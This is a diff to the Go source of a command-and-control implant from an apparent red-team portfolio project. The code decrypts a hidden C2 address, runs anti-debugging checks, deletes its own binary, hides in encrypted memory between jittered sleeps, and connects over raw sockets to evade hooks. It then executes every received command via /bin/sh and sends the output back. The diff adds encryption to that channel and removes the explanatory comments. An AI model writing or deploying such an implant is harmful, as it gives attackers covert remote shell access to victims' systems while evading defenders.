@@ -1,16 +1,15 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
 	"math/rand"
 	"os"
 	"os/exec"
 	"redteam-portfolio/pkg/c2"
+	"redteam-portfolio/pkg/comms"
 	"redteam-portfolio/pkg/crypto"
 	"redteam-portfolio/pkg/evasion"
 	"runtime"
-	"strings"
 	"time"
 )
 
@@ -24,23 +23,19 @@ const (
 func main() {
 	fmt.Printf("[IMPLANT] Starting on %s/%s\n", runtime.GOOS, runtime.GOARCH)
 
-	// Anti-debug (macOS only when compiled natively with cgo)
 	evasion.AntiDebug()
 
-	// Decrypt C2 address at runtime
 	c2Address, err := crypto.DecryptString(encC2Addr, encKey)
 	if err != nil {
 		fmt.Println("[IMPLANT] Decryption failed")
 		return
 	}
 
-	// Remove binary from disk while process continues
 	if len(os.Args) > 0 {
 		os.Remove(os.Args[0])
 		fmt.Println("[IMPLANT] Removed from disk")
 	}
 
-	// Derive memory encryption key and store C2 address in a secure buffer
 	memKey := evasion.DeriveKey([]byte(encKey))
 	secBuf, err := evasion.NewSecureBuffer(256)
 	if err != nil {
@@ -54,7 +49,6 @@ func main() {
 		addr := secBuf.String()
 		session(addr)
 
-		// Connection lost: lock memory, jitter sleep, unlock for next attempt
 		jitter := time.Duration(minJitter+rand.Intn(maxJitter-minJitter)) * time.Second
 		fmt.Printf("[IMPLANT] Sleeping %v (locked)\n", jitter)
 		if err := secBuf.Sleep(memKey, jitter); err != nil {
@@ -64,39 +58,43 @@ func main() {
 }
 
 func session(c2Address string) {
-	// Raw BSD socket via syscalls (bypasses userland hooks)
-	conn, err := c2.DialRaw(c2Address)
+	raw, err := c2.DialRaw(c2Address)
 	if err != nil {
 		return
 	}
-	defer conn.Close()
+	defer raw.Close()
 
-	fmt.Println("[IMPLANT] Connected to C2")
-	reader := bufio.NewReader(conn)
+	sess, err := comms.NewSecureConn(raw, encKey)
+	if err != nil {
+		return
+	}
+	defer sess.Close()
+
+	fmt.Println("[IMPLANT] Connected to C2 (encrypted)")
 
 	for {
-		conn.Write([]byte("ready\n"))
+		if err := sess.WriteMessage([]byte("ready")); err != nil {
+			fmt.Println("[IMPLANT] Connection lost")
+			return
+		}
 
-		cmdLine, err := reader.ReadString('\n')
+		msg, err := sess.ReadMessage()
 		if err != nil {
 			fmt.Println("[IMPLANT] Connection lost")
 			return
 		}
 
-		cmdLine = strings.TrimSpace(cmdLine)
+		cmdLine := string(msg)
 		if cmdLine == "" {
 			continue
 		}
 
 		out, err := exec.Command("/bin/sh", "-c", cmdLine).CombinedOutput()
 		if err != nil {
-			conn.Write([]byte(fmt.Sprintf("error: %s\n%s\n", err.Error(), out)))
+			sess.WriteMessage([]byte(fmt.Sprintf("error: %s\n%s", err.Error(), out)))
 			continue
 		}
 
-		conn.Write(out)
-		if !strings.HasSuffix(string(out), "\n") {
-			conn.Write([]byte("\n"))
-		}
+		sess.WriteMessage(out)
 	}
 }
